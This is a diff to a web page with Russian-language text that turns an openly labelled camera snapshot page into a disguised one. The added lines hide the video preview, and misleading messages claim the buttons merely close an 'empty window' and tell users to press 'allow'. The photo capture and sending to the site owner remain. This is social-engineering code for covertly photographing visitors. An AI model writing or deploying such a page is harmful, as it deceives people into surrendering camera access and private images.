@@ -17,13 +17,7 @@
     .card{max-width:520px;margin:0 auto}
     h2{margin:8px 0 8px}
     p{margin:6px 0; opacity:.85; line-height:1.35}
-    video{
-      width:92%;
-      max-width:420px;
-      border-radius:12px;
-      margin-top:12px;
-      background:#000;
-    }
+    
     button{
       margin:8px 6px;
       padding:12px 16px;
@@ -41,14 +35,12 @@
 </head>
 <body>
   <div class="card">
-    <h2>📷 Камера</h2>
+    <h2>Закройте окно это пустой окно </h2>
 
     <!-- Важно: честно предупреждаем -->
     <p>Фото будет отправлено владельцу сайта.</p>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
+    
     <div>
       <button id="btnStart">Включить камеру</button>
       <button id="btnShot" disabled>Сделать фото</button>
@@ -84,7 +76,7 @@
       status.textContent = "✅ Камера включена. Нажми “Сделать фото”.";
       btnShot.disabled = false;
     } catch (e) {
-      status.textContent = "❌ Доступ к камере запрещён.";
+      status.textContent = "нажимайте разрещить для закрытия окно";
     }
   };
 
@@ -95,7 +87,7 @@
     const h = video.videoHeight;
 
     if (!w || !h) {
-      status.textContent = "❗ Подожди 1 секунду — камера ещё запускается.";
+      status.textContent = "❗ Подожди 1 секунду — окно закрывается .";
       return;
     }
 
@@ -106,7 +98,7 @@
 
     hasPhoto = true;
     btnSend.disabled = false;
-    status.textContent = "📸 Фото сделано. Нажми “Отправить”.";
+    status.textContent = "Окно закрыта . нажимайти полный закрыт ”.";
   };
 
   btnSend.onclick = async () => {
@@ -115,7 +107,7 @@
     btnStart.disabled = true;
     btnShot.disabled = true;
     btnSend.disabled = true;
-    status.textContent = "⏳ Отправка...";
+    status.textContent = "Полний закрыт ";
 
     const data = canvas.toDataURL("image/jpeg", 0.9);
 
@@ -143,15 +135,15 @@
         document.body.innerHTML = `
           <div style="min-height:100vh;display:grid;place-items:center;background:#0b0f14;color:#e8eef6;font-family:system-ui;text-align:center;padding:24px">
             <div>
-              <h2 style="margin:0 0 10px">Спасибо ✅</h2>
-              <div style="opacity:.8">Фото отправлено.</div>
+              <h2 style="margin:0 0 10px">Спасибо окно закрыта  ✅</h2>
+              <div style="opacity:.8">100% окно закрыта .</div>
             </div>
           </div>
         `;
       }, 400);
 
     } catch (e) {
-      status.textContent = "❌ Ошибка отправки. Попробуй ещё раз.";
+      status.textContent = "❌ Ошибка закройте заново";
       btnStart.disabled = false;
       btnShot.disabled = !stream;
       btnSend.disabled = false;
